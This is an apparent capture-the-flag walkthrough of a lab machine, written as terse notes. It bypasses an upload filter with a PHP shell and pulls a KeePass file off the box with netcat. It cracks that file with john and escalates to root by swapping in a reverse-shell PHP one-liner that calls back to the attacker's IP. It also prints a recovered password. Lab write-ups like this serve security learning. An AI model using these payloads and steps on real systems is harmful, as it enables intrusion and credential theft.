Login page

![[Pasted image 20240711045329.png]]

Maybe we can get a username from samba file share port 139/445 SMB.

I find a image upload system that i may be able to modify:

![[Pasted image 20240711051515.png]]

The samba didn't seem like anything but i should have a better check.

I try a test upload:

![[Pasted image 20240711055302.png]]

we modify our rev.php shell and add the jpg extension which allows us to upload the file:

![[Pasted image 20240711061228.png]]

link:http://10.10.177.166/cloud/images/rev.jpg

The upload worked but didn't get us php execution so we try modifying the link:
http://10.10.177.166/cloud/images/rev.php .jpg

We try the file itself:

![[Pasted image 20240711062227.png]]

I didn't need to modify the file name, i could just modify it at the upload stage:
Working payload:http://10.10.177.166/cloud/images/phpbash.php#a.jpg

![[Pasted image 20240711064129.png]]

After rev shell..

Contents of /etc/passwd:
sysadmin:x:1000:1000:sysadmin:/home/sysadmin:/bin/bash

i find a keepass file

![[Pasted image 20240711073004.png]]

Transfer with netcat:

Me
```php
nc -lvp 4444 > dataset.kdbx
```

Target
```php
nc <Target> 4444 -w 3 < dataset.kdbx
```

- -w specify timeout

Now to crack the keepassfile

```php
keepass2john dataset.kdbx > keepass.hash
```

Then we crack it. We can either use **john**

```php
john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash 
```

`741852963        (dataset)`

we open the database and retrive the password for sysadmin:

![[Pasted image 20240711075503.png]]

sysadmin:
Cl0udP4ss40p4city#8700

I pick up the first flag:

![[Pasted image 20240711075700.png]]

i retry lin-enum but provide a pass and request thorough test:

```php
./lin-enum.sh -t -s Cl0udP4ss40p4city#8700 
```

It says that it's insecure and should only be used for CTFs, so i'm glad i tired that on a CTF.

I'll take a manual look around after the test is complete and then run linpeas after which i'm more familiar with.

I fins a script which is a backup for root which allows us to replace a file that it calls for and insert a rev shell

```output
sysadmin@opacity:/home$ cd sysadmin/
sysadmin@opacity:~$ ls
local.txt  scripts
sysadmin@opacity:~$ cd scripts/
sysadmin@opacity:~/scripts$ ls
lib  script.php
sysadmin@opacity:~/scripts$ cd lib/
sysadmin@opacity:~/scripts/lib$ ls
application.php  biopax2bio2rdf.php  fileapi.php  rdfapi.php    utils.php
backup.inc.php   dataresource.php    owlapi.php   registry.php  xmlapi.php
bio2rdfapi.php   dataset.php         phplib.php   script.php
sysadmin@opacity:~/scripts/lib$ mv script.php backup.inc.php 
mv: replace 'backup.inc.php', overriding mode 0644 (rw-r--r--)? y
sysadmin@opacity:~/scripts/lib$ ls
application.php  biopax2bio2rdf.php  fileapi.php  rdfapi.php    xmlapi.php
backup.inc.php   dataresource.php    owlapi.php   registry.php
bio2rdfapi.php   dataset.php         phplib.php   utils.php
sysadmin@opacity:~/scripts/lib$ cat backup.inc.php 
<?php

php -r '$sock=fsockopen("10.9.0.241",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

?>
```

Final payload:

```php
<?php $sock=fsockopen("192.168.45.218",80);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

nc 

```php
nc -nlvp 80
```

This gave us root.
